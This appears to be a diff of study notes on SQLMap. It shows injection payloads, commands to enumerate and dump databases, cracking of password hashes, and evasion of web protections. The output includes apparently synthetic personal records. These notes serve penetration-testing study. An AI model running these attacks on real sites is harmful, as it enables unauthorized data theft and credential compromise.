@@ -335,6 +335,7 @@ Parameter: id (GET)
 
 ```
 
+# SQLMap Output Description
 ## Log Messages Description
 
 #### URL content is stable
@@ -450,6 +451,7 @@ Following after is a listing of all injection points with type, title, and paylo
 
 This indicates the local file system location used for storing all logs, sessions, and output data for a specific target - in this case, `www.example.com`. After such an initial run, where the injection point is successfully detected, all details for future runs are stored inside the same directory's session files. This means that SQLMap tries to reduce the required target requests as much as possible, depending on the session files' data.
 
+# Running SQLMap on an HTTP Request
 ## cURL Commands
 
 One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing `Copy as cURL` feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools:
@@ -489,10 +491,50 @@ gitblanc@htb[/htb]$ sqlmap -r req.txt
 >[!Tip]
 >Similarly to the case with the `--data` option, within the saved request file, we can specify the parameter we want to inject in with an asterisk `(*)`, such as `/?id=*`.
 
+## Custom SQLMap Requests
+
+If we wanted to craft complicated requests manually, there are numerous switches and options to fine-tune SQLMap.
+
+For example, if there is a requirement to specify the (session) cookie value to `PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c` option `--cookie` would be used as follows:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+```
+
+The same effect can be done with the usage of option `-H/--header`:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+```
+
+We can apply the same to options like `--host`, `--referer`, and `-A/--user-agent`, which are used to specify the same HTTP headers' values.
+
+Furthermore, there is a switch `--random-agent` designed to randomly select a `User-agent` header value from the included database of regular browser values. This is an important switch to remember, as more and more protection solutions automatically drop all HTTP traffic containing the recognizable default SQLMap's User-agent value (e.g. `User-agent: sqlmap/1.4.9.12#dev (http://sqlmap.org)`). Alternatively, the `--mobile` switch can be used to imitate the smartphone by using that same header value.
+
+While SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers for the SQLi vulnerability. The easiest way is to specify the "custom" injection mark after the header's value (e.g. `--cookie="id=1*"`). The same principle applies to any other part of the request.
+
+Also, if we wanted to specify an alternative HTTP method, other than `GET` and `POST` (e.g., `PUT`), we can utilize the option `--method`, as follows:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
+```
+
+# Handling SQLMap Errors
 ## Display Errors
 
-Use `--parse-errors`
+The first step is usually to switch the `--parse-errors`, to parse the DBMS errors (if any) and displays them as part of the program run:
 
+```shell
+...SNIP...
+[16:09:20] [INFO] testing if GET parameter 'id' is dynamic
+[16:09:20] [INFO] GET parameter 'id' appears to be dynamic
+[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '))"',),)((' at line 1'"
+[16:09:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''YzDZJELylInm' at line 1'
+...SNIP...
+```
+
+With this option, SQLMap will automatically print the DBMS error, thus giving us clarity on what the issue may be so that we can properly fix it.
 ## Store the traffic
 
 The `-t` option stores the whole traffic content to an output file:
@@ -525,11 +567,76 @@ URI: http://www.example.com:80/?id=1
 ...SNIP...
 ```
 
+## ## Verbose Output
+
+Another useful flag is the `-v` option, which raises the verbosity level of the console output:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.9}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 16:17:40 /2020-09-24/
+
+[16:17:40] [DEBUG] cleaning up configuration parameters
+[16:17:40] [DEBUG] setting the HTTP timeout
+[16:17:40] [DEBUG] setting the HTTP User-Agent header
+[16:17:40] [DEBUG] creating HTTP requests opener object
+[16:17:40] [DEBUG] resolving hostname 'www.example.com'
+[16:17:40] [INFO] testing connection to the target URL
+[16:17:40] [TRAFFIC OUT] HTTP request [#1]:
+GET /?id=1 HTTP/1.1
+Host: www.example.com
+Cache-control: no-cache
+Accept-encoding: gzip,deflate
+Accept: */*
+User-agent: sqlmap/1.4.9 (http://sqlmap.org)
+Connection: close
+
+[16:17:40] [DEBUG] declared web page charset 'utf-8'
+[16:17:40] [TRAFFIC IN] HTTP response [#1] (200 OK):
+Date: Thu, 24 Sep 2020 14:17:40 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 914
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://www.example.com:80/?id=1
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <title>SQLMap Essentials - Case1</title>
+</head>
+
+<body>
+...SNIP...
+```
+
+
 ## Using Proxy
 
 Finally, we can utilize the `--proxy` option to redirect the whole traffic through a (MiTM) proxy (e.g., `Burp`). This will route all SQLMap traffic through `Burp`, so that we can later manually investigate all requests, repeat them, and utilize all features of `Burp` with these requests:
 
 ![](Pasted%20image%2020240729092237.png)
+
+# Attack Tuning
+
+In most cases, SQLMap should run out of the box with the provided target details. Nevertheless, there are options to fine-tune the SQLi injection attempts to help SQLMap in the detection phase. Every payload sent to the target consists of:
+- **vector** (e.g., `UNION ALL SELECT 1,2,VERSION()`): central part of the payload, carrying the useful SQL code to be executed at the target.
+- **boundaries** (e.g. `'<vector>-- -`): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.
 
 ## Prefixes and Suffixes
 
@@ -540,6 +647,19 @@ For such runs, options `--prefix` and `--suffix` can be used as follows:
 sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
 ```
 
+This will result in an enclosure of all vector values between the static prefix `%'))` and the suffix `-- -`.  
+For example, if the vulnerable code at the target is:
+
+```php
+$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
+$result = mysqli_query($link, $query);
+```
+
+The vector `UNION ALL SELECT 1,2,VERSION()`, bounded with the prefix `%'))` and the suffix `-- -`, will result in the following (valid) SQL statement at the target:
+
+```sql
+SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
+```
 ## Level/Risk
 
 By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.
@@ -553,13 +673,77 @@ The best way to check for differences between used boundaries and payloads for d
 
 ```shell
 gitblanc@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5
+
+...SNIP...
+[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
+[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
+...SNIP...
+[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
+[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
+[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
+...SNIP...
+[14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
+[14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
+[14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
+...SNIP...
+[14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
+[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
+[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
 ```
 
 On the other hand, payloads used with the default `--level` value have a considerably smaller set of boundaries:
 
 ```shell
 gitblanc@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3
+...SNIP...
+[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
+[14:20:36] [PAYLOAD] 1 AND 7496=4313
+[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN
+[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
+[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
+[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
 ```
+
+As for vectors, we can compare used payloads as follows:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u www.example.com/?id=1
+...SNIP...
+[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[14:42:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+...SNIP...
+```
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3
+
+...SNIP...
+[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+...SNIP...
+[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
+[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+...SNIP...
+[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
+...SNIP...
+[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
+[14:46:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[14:46:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+...SNIP...
+```
+
+As for the number of payloads, by default (i.e. `--level=1 --risk=1`), the number of payloads used for testing a single parameter goes up to 72, while in the most detailed case (`--level=5 --risk=3`) the number of payloads increases to 7,865.
+
+As SQLMap is already tuned to check for the most common boundaries and vectors, regular users are advised not to touch these options because it will make the whole detection process considerably slower. Nevertheless, in special cases of SQLi vulnerabilities, where usage of `OR` payloads is a must (e.g., in case of `login` pages), we may have to raise the risk level ourselves.
+
+This is because `OR` payloads are inherently dangerous in a default run, where underlying vulnerable SQL statements (although less commonly) are actively modifying the database content (e.g. `DELETE` or `UPDATE`).
 
 ## Advanced Tuning
 
@@ -592,3 +776,723 @@ In some cases, `UNION` SQLi payloads require extra user-provided information t
 Furthermore, in case there is a requirement to use an appendix at the end of a `UNION` query in the form of the `FROM <table>` (e.g., in case of Oracle), we can set it with the option `--union-from` (e.g. `--union-from=users`).  
 Failing to use the proper `FROM` appendix automatically could be due to the inability to detect the DBMS name before its usage.
 
+# Database Enumeration
+
+>[!Info]
+>*Enumeration represents the central part of an SQL injection attack, which is done right after the successful detection and confirmation of exploitability of the targeted SQLi vulnerability. It consists of lookup and retrieval (i.e., exfiltration) of all the available information from the vulnerable database.*
+
+## SQLMap Data Exfiltration
+
+For such purpose, SQLMap has a predefined set of queries for all supported DBMSes, where each entry represents the SQL that must be run at the target to retrieve the desired content. For example, the excerpts from [queries.xml](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml) for a MySQL DBMS can be seen below:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+<root>
+    <dbms value="MySQL">
+        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
+        <cast query="CAST(%s AS NCHAR)"/>
+        <length query="CHAR_LENGTH(%s)"/>
+        <isnull query="IFNULL(%s,' ')"/>
+...SNIP...
+        <banner query="VERSION()"/>
+        <current_user query="CURRENT_USER()"/>
+        <current_db query="DATABASE()"/>
+        <hostname query="@@HOSTNAME"/>
+        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
+        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
+        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
+        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
+        <users>
+            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
+            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
+        </users>
+    ...SNIP...
+```
+
+For example, if a user wants to retrieve the "banner" (switch `--banner`) for the target based on MySQL DBMS, the `VERSION()` query will be used for such purpose.  
+In case of retrieval of the current user name (switch `--current-user`), the `CURRENT_USER()` query will be used.
+
+Another example is retrieving all the usernames (i.e., tag `<users>`). There are two queries used, depending on the situation. The query marked as `inband` is used in all non-blind situations (i.e., UNION-query and error-based SQLi), where the query results can be expected inside the response itself. The query marked as `blind`, on the other hand, is used for all blind situations, where data has to be retrieved row-by-row, column-by-column, and bit-by-bit.
+
+## Basic DB Data Enumeration
+
+Usually, after a successful detection of an SQLi vulnerability, we can begin the enumeration of basic details from the database, such as the hostname of the vulnerable target (`--hostname`), current user's name (`--current-user`), current database name (`--current-db`), or password hashes (`--passwords`). SQLMap will skip SQLi detection if it has been identified earlier and directly start the DBMS enumeration process.
+
+Enumeration usually starts with the retrieval of the basic information:
+
+- Database version banner (switch `--banner`)
+- Current user name (switch `--current-user`)
+- Current database name (switch `--current-db`)
+- Checking if the current user has DBA (administrator) rights (switch `--is-dba`)
+
+The following SQLMap command does all of the above:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.9}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 13:30:57 /2020-09-17/
+
+[13:30:57] [INFO] resuming back-end DBMS 'mysql' 
+[13:30:57] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5134=5134
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 5907 FROM(SELECT COUNT(*),CONCAT(0x7170766b71,(SELECT (ELT(5907=5907,1))),0x7178707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170766b71,0x7a76726a6442576667644e6b476e577665615168564b7a696a6d4646475159716f784f5647535654,0x7178707671)-- -
+---
+[13:30:57] [INFO] the back-end DBMS is MySQL
+[13:30:57] [INFO] fetching banner
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS: MySQL >= 5.0
+banner: '5.1.41-3~bpo50+1'
+[13:30:58] [INFO] fetching current user
+current user: 'root@%'
+[13:30:58] [INFO] fetching current database
+current database: 'testdb'
+[13:30:58] [INFO] testing if current user is DBA
+[13:30:58] [INFO] fetching current user
+current user is DBA: True
+[13:30:58] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'
+
+[*] ending @ 13:30:58 /2020-09-17/
+```
+
+From the above example, we can see that the database version is quite old (MySQL 5.1.41 - from November 2009), and the current user name is `root`, while the current database name is `testdb`.
+
+>[!Note]
+>The '**root**' user in the database context in the vast majority of cases does not have any relation with the OS user "**root**", other than that representing the privileged user within the DBMS context. This basically means that the DB user should not have any constraints within the database context, while OS privileges (e.g. file system writing to arbitrary location) should be minimalistic, at least in the recent deployments. The same principle applies for the generic 'DBA' role.
+
+## Table Enumeration
+
+In most common scenarios, after finding the current database name (i.e. `testdb`), the retrieval of table names would be by using the `--tables` option and specifying the DB name with `-D testdb`, is as follows:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
+
+...SNIP...
+[13:59:24] [INFO] fetching tables for database: 'testdb'
+Database: testdb
+[4 tables]
++---------------+
+| member        |
+| data          |
+| international |
+| users         |
++---------------+
+```
+
+After spotting the table name of interest, retrieval of its content can be done by using the `--dump` option and specifying the table name with `-T users`, as follows:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
+
+...SNIP...
+Database: testdb
+
+Table: users
+[4 entries]
++----+--------+------------+
+| id | name   | surname    |
++----+--------+------------+
+| 1  | luther | blisset    |
+| 2  | fluffy | bunny      |
+| 3  | wu     | ming       |
+| 4  | NULL   | nameisnull |
++----+--------+------------+
+
+[14:07:18] [INFO] table 'testdb.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv'
+```
+
+The console output shows that the table is dumped in formatted CSV format to a local file, `users.csv`.
+
+>[!Tip]
+>Apart from default CSV, we can specify the output format with the option `--dump-format` to HTML or SQLite, so that we can later further investigate the DB in an SQLite environment.
+
+![](Pasted%20image%2020250218121241.png)
+
+## Table/Row Enumeration
+
+When dealing with large tables with many columns and/or rows, we can specify the columns (e.g., only `name` and `surname` columns) with the `-C` option, as follows:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
+
+...SNIP...
+Database: testdb
+
+Table: users
+[4 entries]
++--------+------------+
+| name   | surname    |
++--------+------------+
+| luther | blisset    |
+| fluffy | bunny      |
+| wu     | ming       |
+| NULL   | nameisnull |
++--------+------------+
+```
+
+To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the `--start` and `--stop` options (e.g., start from 2nd up to 3rd entry), as follows:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
+
+...SNIP...
+Database: testdb
+
+Table: users
+[2 entries]
++----+--------+---------+
+| id | name   | surname |
++----+--------+---------+
+| 2  | fluffy | bunny   |
+| 3  | wu     | ming    |
++----+--------+---------+
+```
+
+## Full DB Enumeration
+
+Instead of retrieving content per single-table basis, we can retrieve all tables inside the database of interest by skipping the usage of option `-T` altogether (e.g. `--dump -D testdb`). By simply using the switch `--dump` without specifying a table with `-T`, all of the current database content will be retrieved. As for the `--dump-all` switch, all the content from all the databases will be retrieved.
+
+In such cases, a user is also advised to include the switch `--exclude-sysdbs` (e.g. `--dump-all --exclude-sysdbs`), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.
+
+# Advanced Database Enumeration
+
+## DB Schema Enumeration
+
+If we wanted to retrieve the structure of all of the tables so that we can have a complete overview of the database architecture, we could use the switch `--schema`:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema
+
+...SNIP...
+Database: master
+Table: log
+[3 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| date   | datetime     |
+| agent  | varchar(512) |
+| id     | int(11)      |
++--------+--------------+
+
+Database: owasp10
+Table: accounts
+[4 columns]
++-------------+---------+
+| Column      | Type    |
++-------------+---------+
+| cid         | int(11) |
+| mysignature | text    |
+| password    | text    |
+| username    | text    |
++-------------+---------+
+...
+Database: testdb
+Table: data
+[2 columns]
++---------+---------+
+| Column  | Type    |
++---------+---------+
+| content | blob    |
+| id      | int(11) |
++---------+---------+
+
+Database: testdb
+Table: users
+[3 columns]
++---------+---------------+
+| Column  | Type          |
++---------+---------------+
+| id      | int(11)       |
+| name    | varchar(500)  |
+| surname | varchar(1000) |
++---------+---------------+
+```
+
+## Searching for Data
+
+When dealing with complex database structures with numerous tables and columns, we can search for databases, tables, and columns of interest, by using the `--search` option. This option enables us to search for identifier names by using the `LIKE` operator. For example, if we are looking for all of the table names containing the keyword `user`, we can run SQLMap as follows:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user
+
+...SNIP...
+[14:24:19] [INFO] searching tables LIKE 'user'
+Database: testdb
+[1 table]
++-----------------+
+| users           |
++-----------------+
+
+Database: master
+[1 table]
++-----------------+
+| users           |
++-----------------+
+
+Database: information_schema
+[1 table]
++-----------------+
+| USER_PRIVILEGES |
++-----------------+
+
+Database: mysql
+[1 table]
++-----------------+
+| user            |
++-----------------+
+
+do you want to dump found table(s) entries? [Y/n] 
+...SNIP...
+```
+
+In the above example, we can immediately spot a couple of interesting data retrieval targets based on these search results. We could also have tried to search for all column names based on a specific keyword (e.g. `pass`):
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
+
+...SNIP...
+columns LIKE 'pass' were found in the following databases:
+Database: owasp10
+Table: accounts
+[1 column]
++----------+------+
+| Column   | Type |
++----------+------+
+| password | text |
++----------+------+
+
+Database: master
+Table: users
+[1 column]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| password | varchar(512) |
++----------+--------------+
+
+Database: mysql
+Table: user
+[1 column]
++----------+----------+
+| Column   | Type     |
++----------+----------+
+| Password | char(41) |
++----------+----------+
+
+Database: mysql
+Table: servers
+[1 column]
++----------+----------+
+| Column   | Type     |
++----------+----------+
+| Password | char(64) |
++----------+----------+
+```
+
+## Password Enumeration and Cracking
+
+Once we identify a table containing passwords (e.g. `master.users`), we can retrieve that table with the `-T` option, as previously shown:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
+
+...SNIP...
+[14:31:41] [INFO] fetching columns for table 'users' in database 'master'
+[14:31:41] [INFO] fetching entries for table 'users' in database 'master'
+[14:31:41] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+
+[14:31:41] [INFO] using hash method 'sha1_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[14:31:41] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+
+[14:31:41] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
+[14:31:41] [INFO] starting 8 processes 
+[14:31:41] [INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'                                                                                                         
+[14:31:41] [INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'                                                                                                         
+...SNIP...
+[14:31:47] [INFO] cracked password 'Zc1uowqg6' for hash '0ff476c2676a2e5f172fe568110552f2e910c917'                                                                                                        
+Database: master                                                                                                                                                                                          
+Table: users
+[32 entries]
++----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
+| id | cc               | name              | email                       | phone        | address                | birthday          | password                                                    | occupation                                        |
++----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
+| 1  | 5387278172507117 | Maynard Rice      | MaynardMRice@yahoo.com      | 281-559-0172 | 1698 Bird Spring Lane  | March 1 1958      | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)             | Linemen                                           |
+| 2  | 4539475107874477 | Julio Thomas      | JulioWThomas@gmail.com      | 973-426-5961 | 1207 Granville Lane    | February 14 1972  | 10945aa229a6d569f226976b22ea0e900a1fc219 (taqris)           | Agricultural product sorter                       |
+| 3  | 4716522746974567 | Kenneth Maloney   | KennethTMaloney@gmail.com   | 954-617-0424 | 2811 Kenwood Place     | May 14 1989       | a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 (hibiskus)         | General and operations manager                    |
+| 4  | 4929811432072262 | Gregory Stumbaugh | GregoryBStumbaugh@yahoo.com | 410-680-5653 | 1641 Marshall Street   | May 7 1936        | b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e (spiderpig8574376) | Foreign language interpreter                      |
+| 5  | 4539646911423277 | Bobby Granger     | BobbyJGranger@gmail.com     | 212-696-1812 | 4510 Shinn Street      | December 22 1939  | aed6d83bab8d9234a97f18432cd9a85341527297 (1955chev)         | Medical records and health information technician |
+| 6  | 5143241665092174 | Kimberly Wright   | KimberlyMWright@gmail.com   | 440-232-3739 | 3136 Ralph Drive       | June 18 1972      | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      | Electrologist                                     |
+| 7  | 5503989023993848 | Dean Harper       | DeanLHarper@yahoo.com       | 440-847-8376 | 3766 Flynn Street      | February 3 1974   | 2b89b43b038182f67a8b960611d73e839002fbd9 (raided)           | Store detective                                   |
+| 8  | 4556586478396094 | Gabriela Waite    | GabrielaRWaite@msn.com      | 732-638-1529 | 2459 Webster Street    | December 24 1965  | f5eb0fbdd88524f45c7c67d240a191163a27184b (ssival47)         | Telephone station installer                       |
+```
+
+We can see in the previous example that SQLMap has automatic password hashes cracking capabilities. Upon retrieving any value that resembles a known hash format, SQLMap prompts us to perform a dictionary-based attack on the found hashes.
+
+Hash cracking attacks are performed in a multi-processing manner, based on the number of cores available on the user's computer. Currently, there is an implemented support for cracking 31 different types of hash algorithms, with an included dictionary containing 1.4 million entries (compiled over the years with most common entries appearing in publicly available password leaks). Thus, if a password hash is not randomly chosen, there is a good probability that SQLMap will automatically crack it.
+
+## DB Users Password Enumeration and Cracking
+
+Apart from user credentials found in DB tables, we can also attempt to dump the content of system tables containing database-specific credentials (e.g., connection credentials). To ease the whole process, SQLMap has a special switch `--passwords` designed especially for such a task:
+
+```shell
+gitblanc@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
+
+...SNIP...
+[14:25:20] [INFO] fetching database users password hashes
+[14:25:20] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+[14:25:20] [INFO] retrieved: 'root'
+[14:25:20] [INFO] retrieved: 'root'
+[14:25:20] [INFO] retrieved: 'root'
+[14:25:20] [INFO] retrieved: 'debian-sys-maint'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+
+do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y
+
+[14:25:20] [INFO] using hash method 'mysql_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[14:25:20] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+
+[14:25:20] [INFO] starting dictionary-based cracking (mysql_passwd)
+[14:25:20] [INFO] starting 8 processes 
+[14:25:26] [INFO] cracked password 'testpass' for user 'root'
+database management system users password hashes:
+
+[*] debian-sys-maint [1]:
+    password hash: *6B2C58EABD91C1776DA223B088B601604F898847
+[*] root [1]:
+    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
+    clear-text password: testpass
+
+[14:25:28] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'
+
+[*] ending @ 14:25:28 /2020-09-18/
+```
+
+>[!Tip]
+>The `--all` switch in combination with the `--batch` switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.
+
+This basically means that everything accessible will be retrieved, potentially running for a very long time. We will need to find the data of interest in the output files manually.
+
+# Bypassing Web Application Protections
+
+There won't be any protection(s) deployed on the target side in an ideal scenario, thus not preventing automatic exploitation. Otherwise, we can expect problems when running an automated tool of any kind against such a target. Nevertheless, many mechanisms are incorporated into SQLMap, which can help us successfully bypass such protections.
+
+## Anti-CSRF Token Bypass
+
+One of the first lines of defense against the usage of automation tools is the incorporation of anti-CSRF (i.e., Cross-Site Request Forgery) tokens into all HTTP requests, especially those generated as a result of web-form filling.
+
